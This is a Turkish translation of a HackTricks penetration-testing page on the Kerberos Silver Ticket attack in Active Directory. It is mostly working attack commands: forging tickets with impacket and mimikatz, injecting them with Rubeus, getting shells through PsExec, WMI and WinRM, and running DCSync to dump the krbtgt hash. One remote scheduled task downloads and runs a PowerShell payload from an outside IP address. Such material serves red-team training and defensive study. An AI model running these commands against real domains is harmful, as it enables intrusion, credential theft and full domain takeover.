# Gümüş Bilet

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Eğer **hacking kariyeri** ilginizi çekiyorsa ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı polonyaca yazılı ve konuşulan gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

## Gümüş bilet

**Gümüş Bilet** saldırısı, Active Directory (AD) ortamlarında hizmet biletlerinin sömürülmesini içerir. Bu yöntem, genellikle yönetici ayrıcalıklarını hedefleyerek, ağdaki belirli hizmetlere **herhangi bir kullanıcıyı taklit ederek** erişebilmek için bir bilgisayar hesabı gibi bir hizmet hesabının NTLM karmasının elde edilmesine dayanır. Sahte bilet ile saldırgan, ağdaki belirli hizmetlere erişebilir. Bilet oluşturmak için, işletim sistemine bağlı olarak farklı araçlar kullanılır:

### Linux üzerinde
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows Üzerinde
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS hizmeti, kurbanın dosya sistemine erişmek için yaygın bir hedef olarak belirtilir, ancak HOST ve RPCSS gibi diğer hizmetler de görevler ve WMI sorguları için istismar edilebilir.

## Kullanılabilir Hizmetler

| Hizmet Türü                               | Hizmet Gümüş Biletleri                                                    |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Uzak Yönetimi                        | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda sadece şunu isteyebilirsiniz: WINRM</p> |
| Zamanlanmış Görevler                            | HOST                                                                       |
| Windows Dosya Paylaşımı, ayrıca psexec            | CIFS                                                                       |
| LDAP işlemleri, DCSync dahil           | LDAP                                                                       |
| Windows Uzak Sunucu Yönetim Araçları | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Gümüş Biletler                             | krbtgt                                                                     |

**Rubeus** kullanarak bu biletleri aşağıdaki parametre kullanılarak **tümünü isteyebilirsiniz**:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Gümüş biletler Olay Kimlikleri

* 4624: Hesap Oturumu
* 4634: Hesap Oturumu Kapatma
* 4672: Yönetici Oturumu

## Hizmet biletlerinin kötüye kullanılması

Aşağıdaki örneklerde, biletin yönetici hesabını taklit ederek alındığını varsayalım.

### CIFS

Bu bilet ile **SMB** üzerinden `C$` ve `ADMIN$` klasörüne erişebilir ve uzak dosya sistemine dosya kopyalayabilirsiniz, sadece şuna benzer bir işlem yapmanız yeterlidir:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ayrıca, **psexec** kullanarak ana bilgisayarda bir kabuk elde edebilir veya keyfi komutlar çalıştırabilirsiniz:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### ANA BİLGİSAYAR

Bu izinle, uzaktaki bilgisayarlarda zamanlanmış görevler oluşturabilir ve keyfi komutlar çalıştırabilirsiniz:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Bu biletlerle, hedef sisteminde WMI'ı **yürütebilirsiniz**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Aşağıdaki sayfada **wmiexec hakkında daha fazla bilgi** bulabilirsiniz:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Bir bilgisayara winrm erişimi ile **erişebilirsiniz** ve hatta bir PowerShell alabilirsiniz:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Aşağıdaki sayfayı kontrol edin, uzak bir ana bilgisayara winrm kullanarak bağlanmanın daha fazla yolunu öğrenmek için:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Uzaktaki bilgisayara erişmek için **winrm aktif ve dinleme modunda** olmalıdır.
{% endhint %}

### LDAP

Bu yetkiyle, **DCSync** kullanarak DC veritabanını dökümleyebilirsiniz:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
DCSync hakkında daha fazla bilgi edinin aşağıdaki sayfada:

## Referanslar
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı polonyaca yazılı ve konuşma becerisi gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>AWS hacking'i sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github reposuna **PR göndererek paylaşın**.

</details>
